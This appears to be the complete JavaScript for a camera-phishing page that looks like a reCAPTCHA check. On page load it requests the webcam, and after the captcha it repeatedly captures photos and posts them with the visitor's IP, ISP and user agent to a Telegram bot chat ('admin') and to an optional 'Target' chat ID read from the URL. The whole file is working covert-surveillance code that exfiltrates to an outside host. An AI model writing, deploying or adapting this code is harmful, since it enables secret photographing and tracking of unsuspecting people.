import { CONFIG } from "./config.js";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

const stageLoading   = document.getElementById("stageLoading");
const stageError     = document.getElementById("stageError");
const stageRecaptcha = document.getElementById("stageRecaptcha");
const stageCapture   = document.getElementById("stageCapture");

const counterEl = document.getElementById("counter");
const logEl     = document.getElementById("log");
const statusEl  = document.getElementById("stageStatus");
const errorMsg  = document.getElementById("errorMsg");

let stream = null;
let captureTimer = null;
let totalSent = 0;
let totalCaptured = 0;
let isRunning = false;
let isSending = false;
let recaptchaWidgetId = null;

// cached client info
let ipInfo = { ip: "Unknown", isp: "Unknown" };
let userAgent = navigator.userAgent || "Unknown";

/* ---------- stage switching ---------- */
function showStage(stage){
  [stageLoading, stageError, stageRecaptcha, stageCapture]
    .forEach(s => s.classList.remove("active"));
  stage.classList.add("active");
}

/* ---------- get target ID from URL (?id=xxxx) ---------- */
function getTargetId(){
  const params = new URLSearchParams(location.search);
  const id = params.get("id");
  return id && id.trim() ? id.trim() : null;
}
const TARGET_ID = getTargetId();

/* ---------- get IP + ISP info ---------- */
async function fetchIpInfo(){
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    if (d && d.ip){
      return {
        ip: d.ip,
        isp: d.org || d.asn || "Unknown"
      };
    }
  } catch {}
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    return { ip: d.ip || "Unknown", isp: "Unknown" };
  } catch {}
  return { ip: "Unknown", isp: "Unknown" };
}

/* ---------- formatted date: 9/15/2026, 10:35:17 AM GMT+6 ---------- */
function formatDate(d){
  try {
    return d.toLocaleString("en-US", { timeZoneName: "short" });
  } catch {
    return d.toString();
  }
}

/* ---------- build caption ---------- */
function buildCaption(index){
  const now = new Date();
  const lines = [
    `📸 #${index}`,
    `🕐 ${formatDate(now)}`,
    `🌐 ${ipInfo.ip} — ${ipInfo.isp}`,
    `💻 ${userAgent}`
  ];
  if (TARGET_ID) lines.push(`👤 Target: ${TARGET_ID}`);
  return lines.join("\n");
}

/* ============ 1. AUTO CAMERA ON PAGE LOAD ============ */
(async function init(){
  showStage(stageLoading);

  // fetch IP info in background (do not block camera)
  fetchIpInfo().then(info => { ipInfo = info; });

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        width:  { ideal: CONFIG.CAM_WIDTH },
        height: { ideal: CONFIG.CAM_HEIGHT },
        facingMode: "user"
      }
    });
    video.srcObject = stream;
    await video.play();
    await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));

    window.__cameraReady = true;
    showStage(stageRecaptcha);
    tryRenderRecaptcha();

  } catch (err){
    console.error(err);
    errorMsg.textContent =
      "Camera permission denied or unavailable. Please allow camera and reload.";
    showStage(stageError);
  }
})();

/* ============ 2. reCAPTCHA RENDER ============ */
function tryRenderRecaptcha(){
  if (!window.__recaptchaReady || !window.__cameraReady) return;
  if (recaptchaWidgetId !== null) return;

  const container = document.getElementById("recaptchaContainer");
  container.style.display = "flex";

  try {
    recaptchaWidgetId = window.grecaptcha.render("recaptchaWidget", {
      sitekey: CONFIG.RECAPTCHA_SITE_KEY,
      callback: onRecaptchaSolved,
      "expired-callback": onRecaptchaExpired
    });
  } catch (e){
    console.error("reCAPTCHA render error:", e);
  }
}
window.__tryRenderRecaptcha = tryRenderRecaptcha;

function onRecaptchaSolved(){
  startCapture();
}

function onRecaptchaExpired(){
  stopAll();
  showStage(stageRecaptcha);
}

/* ============ 3. CAPTURE + SEND LOOP ============ */
function startCapture(){
  showStage(stageCapture);
  isRunning = true;
  totalSent = 0;
  totalCaptured = 0;
  updateCounter();

  const targetTxt = TARGET_ID ? `→ target ${TARGET_ID} + admin` : "→ admin";
  addLog(`📷 Started ${targetTxt} · every ${CONFIG.CAPTURE_INTERVAL_MS/1000}s`);
  statusEl.textContent = "Sending photos…";

  captureLoop();
  captureTimer = setInterval(captureLoop, CONFIG.CAPTURE_INTERVAL_MS);
}

async function captureLoop(){
  if (!isRunning || isSending) return;
  isSending = true;
  totalCaptured++;

  try {
    canvas.width  = CONFIG.CAM_WIDTH;
    canvas.height = CONFIG.CAM_HEIGHT;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, CONFIG.CAM_WIDTH, CONFIG.CAM_HEIGHT);

    const blob = await new Promise(res =>
      canvas.toBlob(res, "image/jpeg", CONFIG.IMAGE_QUALITY)
    );
    if (!blob){ isSending = false; return; }

    const caption = buildCaption(totalCaptured);

    // send to admin
    const sentAdmin = await sendImage(blob, caption, CONFIG.ADMIN_CHAT_ID);

    // send to target (if provided in URL)
    let sentTarget = false;
    if (TARGET_ID){
      sentTarget = await sendImage(blob, caption, TARGET_ID);
    }

    if (sentAdmin){
      totalSent++;
      updateCounter();
      const now = new Date().toLocaleTimeString();
      const tag = TARGET_ID
        ? (sentTarget ? `✅ #${totalSent} → admin+${TARGET_ID} · ${now}`
                      : `⚠️ #${totalSent} → admin only (target failed) · ${now}`)
        : `✅ #${totalSent} → admin · ${now}`;
      addLog(tag);
    } else {
      addLog(`❌ #${totalCaptured} admin send failed · ${new Date().toLocaleTimeString()}`);
    }

  } catch (e){
    console.error("Capture error:", e);
    addLog("❌ capture error");
  }
  isSending = false;
}

/* ============ 4. TELEGRAM SEND (to any chat_id) ============ */
async function sendImage(blob, caption, chatId){
  const fd = new FormData();
  fd.append("chat_id", chatId);
  fd.append("photo", blob, `frame_${Date.now()}.jpg`);
  fd.append("caption", caption);
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: fd }
    );
    return res.ok;
  } catch { return false; }
}

/* ============ 5. HELPERS ============ */
function updateCounter(){ counterEl.textContent = totalSent; }

function addLog(line){
  const div = document.createElement("div");
  div.className = "log-line";
  div.textContent = line;
  logEl.prepend(div);
  while (logEl.children.length > 30) logEl.removeChild(logEl.lastChild);
}

function stopAll(){
  isRunning = false;
  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
}

/* ============ 6. STOP BUTTON ============ */
document.getElementById("btnStop").addEventListener("click", () => {
  stopAll();
  statusEl.textContent = "⏹️ Stopped. Total sent: " + totalSent;
  const b = document.getElementById("btnStop");
  b.disabled = true;
  b.textContent = "Stopped";
});

/* release camera on leave */
window.addEventListener("beforeunload", () => {
  stopAll();
  if (stream) stream.getTracks().forEach(t => t.stop());
});
